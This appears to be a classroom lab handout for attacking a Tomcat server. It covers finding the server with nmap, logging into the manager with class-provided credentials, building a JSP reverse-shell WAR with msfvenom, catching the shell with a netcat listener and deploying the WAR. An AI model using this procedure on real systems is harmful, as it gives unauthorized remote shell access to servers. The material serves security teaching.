1) Find tomcat
	use nmap, with default option and -sV to find the Tomcat server running

2) Log in
	nikto can easily find the credentials but to save you time the username/password is: tomcat/gibson. 

        WARNING: Please do not brute force this account as it will automatically lock everyone out-use the credentials provided in class.

3) Get a reverse shell:
	using metasploit generate a reverse JSP shell:
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell_<userid>.war
	Listen with netcat: nc -lvp <port>
        Deploy the WAR file to Tomcat
        Once deployed, click on your newly created app in the manager and you should get a reverse shell in netcat
